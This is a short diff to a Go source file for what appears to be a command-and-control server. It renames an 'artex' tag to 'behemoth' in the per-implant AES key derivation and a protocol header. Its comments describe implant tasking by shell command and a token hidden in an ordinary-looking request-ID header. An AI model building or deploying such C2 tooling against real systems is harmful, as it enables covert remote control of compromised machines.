@@ -13,7 +13,7 @@ import (
 
 // Wire encodings. "none" is base64(JSON) — confidentiality rides on TLS.
 // "aes" is base64(AES-256-CBC(PKCS7(JSON))) with the IV in the X-IV header;
-// the key is SHA-256("artex-c2:"+token), so every implant gets its own key.
+// the key is SHA-256("behemoth-c2:"+token), so every implant gets its own key.
 const (
 	encNone = "none"
 	encAES  = "aes"
@@ -22,7 +22,7 @@ const (
 // Header names used by the implant protocol.
 const (
 	hdrSecret      = "X-Request-ID" // implant token
-	hdrEnc         = "X-Artex-Enc"  // none | aes
+	hdrEnc         = "X-Behemoth-Enc"  // none | aes
 	hdrIV          = "X-IV"         // hex IV for aes payloads
 	hdrTaskID      = "X-Task-Id"    // mirrors body field so plain-shell implants need no JSON parser
 	hdrTaskCmd     = "X-Task-Cmd"   // shell | kill
@@ -31,7 +31,7 @@ const (
 )
 
 func wireKey(token string) []byte {
-	sum := sha256.Sum256([]byte("artex-c2:" + token))
+	sum := sha256.Sum256([]byte("behemoth-c2:" + token))
 	return sum[:]
 }
 
